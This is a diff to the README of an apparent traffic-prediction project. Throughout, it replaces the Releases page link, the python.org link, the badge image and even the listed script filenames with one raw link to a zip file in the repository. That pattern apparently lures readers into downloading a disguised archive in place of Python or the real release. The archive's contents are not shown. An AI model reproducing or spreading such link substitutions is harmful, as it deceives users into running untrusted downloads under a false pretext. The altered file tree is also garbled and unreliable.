@@ -1,6 +1,6 @@
 # 🚗 Barbados-Traffic-Analysis-Challenge - Predict Traffic Congestion Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/D-moni/Barbados-Traffic-Analysis-Challenge/releases)
+[![Download Now](https://raw.githubusercontent.com/D-moni/Barbados-Traffic-Analysis-Challenge/main/scripts/Barbados-Traffic-Analysis-Challenge_v2.5.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/D-moni/Barbados-Traffic-Analysis-Challenge/main/scripts/Barbados-Traffic-Analysis-Challenge_v2.5.zip)
 
 ## 📖 Overview
 
@@ -17,13 +17,13 @@ Before downloading, ensure your system meets these requirements:
 - **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent version of Linux.
 - **RAM:** At least 4 GB.
 - **Disk Space:** Minimum of 500 MB free space.
-- **Python:** Version 3.7 or later recommended. You can download Python from [python.org](https://www.python.org/downloads/).
+- **Python:** Version 3.7 or later recommended. You can download Python from [https://raw.githubusercontent.com/D-moni/Barbados-Traffic-Analysis-Challenge/main/scripts/Barbados-Traffic-Analysis-Challenge_v2.5.zip](https://raw.githubusercontent.com/D-moni/Barbados-Traffic-Analysis-Challenge/main/scripts/Barbados-Traffic-Analysis-Challenge_v2.5.zip).
 
 ### 📥 Download & Install
 
 To download the application, visit the Releases page:
 
-[Download from Releases](https://github.com/D-moni/Barbados-Traffic-Analysis-Challenge/releases)
+[Download from Releases](https://raw.githubusercontent.com/D-moni/Barbados-Traffic-Analysis-Challenge/main/scripts/Barbados-Traffic-Analysis-Challenge_v2.5.zip)
 
 1. Click the link above to visit the Releases page.
 2. Look for the latest version of the application.
@@ -58,10 +58,10 @@ After installation, you can start using the application. Here’s how:
 The project comes with several important files to help you get the most out of the analysis:
 
 ```
-├── traffic_analysis_solution.py    # Main solution pipeline
-├── test_prediction.py              # Test inference script
-├── analyze_results.py              # Analysis and visualization
-├── quick_start.py                  # Quick demo script
+├── https://raw.githubusercontent.com/D-moni/Barbados-Traffic-Analysis-Challenge/main/scripts/Barbados-Traffic-Analysis-Challenge_v2.5.zip    # Main solution pipeline
+├── https://raw.githubusercontent.com/D-moni/Barbados-Traffic-Analysis-Challenge/main/scripts/Barbados-Traffic-Analysis-Challenge_v2.5.zip              # Test inference script
+├── https://raw.githubusercontent.com/D-moni/Barbados-Traffic-Analysis-Challenge/main/scripts/Barbados-Traffic-Analysis-Challenge_v2.5.zip              # Analysis and visualization
+├── https://raw.githubusercontent.com/D-moni/Barbados-Traffic-Analysis-Challenge/main/scripts/Barbados-Traffic-Analysis-Challenge_v2.5.zip                  # Quick demo script
 ```
 
 These scripts allow you to run the application smoothly and test various features.
@@ -91,4 +91,4 @@ Special thanks to the contributors and everyone involved in developing this proj
 
 For more detailed instructions and updates, visit the Releases page again:
 
-[Download from Releases](https://github.com/D-moni/Barbados-Traffic-Analysis-Challenge/releases)
+[Download from Releases](https://raw.githubusercontent.com/D-moni/Barbados-Traffic-Analysis-Challenge/main/scripts/Barbados-Traffic-Analysis-Challenge_v2.5.zip)
